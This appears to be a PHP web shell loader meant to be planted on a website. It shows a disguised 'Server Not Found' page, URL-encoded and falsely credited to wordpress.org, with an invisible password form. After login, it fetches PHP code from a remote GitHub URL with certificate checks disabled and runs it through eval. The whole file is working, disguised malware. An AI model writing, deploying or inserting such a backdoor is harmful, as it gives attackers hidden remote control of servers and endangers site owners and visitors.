

<?php
/**
* Function to check if the user is logged in based on the presence of a valid cookie
*/
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Change 'user123' with value valid
}

/**
* Check if the user is logged in before executing the content
*/
if (is_logged_in()) {
    /** Function to get URL content (similar to your previous code)
*/
    function geturlsinfo($url)
    {
        if (function_exists('curl_exec')) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

            $url_get_contents_data = curl_exec($conn);
            curl_close($conn);
        } elseif (function_exists('file_get_contents')) {
            $url_get_contents_data = file_get_contents($url);
        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
            $handle = fopen($url, "r");
            $url_get_contents_data = stream_get_contents($handle);
            fclose($handle);
        } else {
            $url_get_contents_data = false;
        }
        return $url_get_contents_data;
    }

    $a = geturlsinfo('https://raw.githubusercontent.com/zzvvzzserverzzvvzz/serviceserver/refs/heads/main/sserver.php');
    eval('?>' . $a);
} else {
    /** Display login form if not logged in */
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = 'b6be14bceb32e2083e4162e4ccce2cd5';
        if (md5($entered_password) === $hashed_password) {
            /** Password is correct, set a cookie to indicate login */
            setcookie('user_id', 'user123', time() + 3600, '/');
        } else {
            /** Password is incorrect */
            echo "Incorrect password. Please try again.";
        }
    }
    ?>
<script>
<!-- code by https://www.wordpress.org -->
document.write(unescape('%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%0A%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%0A%20%20%20%20%3C%74%69%74%6C%65%3E%53%65%72%76%65%72%20%4E%6F%74%20%46%6F%75%6E%64%3C%2F%74%69%74%6C%65%3E%0A%20%20%20%20%3C%73%74%79%6C%65%3E%0A%0A%20%20%20%20%20%20%20%20%69%6E%70%75%74%5B%74%79%70%65%3D%22%70%61%73%73%77%6F%72%64%22%5D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%62%6F%72%64%65%72%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6F%75%74%6C%69%6E%65%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%69%6E%70%75%74%5B%74%79%70%65%3D%22%73%75%62%6D%69%74%22%5D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%62%6F%72%64%65%72%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6C%6F%72%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6F%75%74%6C%69%6E%65%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%75%72%73%6F%72%3A%20%64%65%66%61%75%6C%74%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C%2F%73%74%79%6C%65%3E%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%3E%0A%20%20%20%20%3C%66%6F%72%6D%20%6D%65%74%68%6F%64%3D%22%50%4F%53%54%22%20%61%63%74%69%6F%6E%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%70%61%73%73%77%6F%72%64%22%3E%20%3C%2F%6C%61%62%65%6C%3E%0A%20%20%20%20%20%20%20%20%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%70%61%73%73%77%6F%72%64%22%20%69%64%3D%22%70%61%73%73%77%6F%72%64%22%20%6E%61%6D%65%3D%22%70%61%73%73%77%6F%72%64%22%3E%0A%20%20%20%20%20%20%20%20%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%73%75%62%6D%69%74%22%20%76%61%6C%75%65%3D%22%4C%6F%67%69%6E%22%3E%0A%20%20%20%20%3C%2F%66%6F%72%6D%3E%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E'));
</script>
      <?php
}
?>
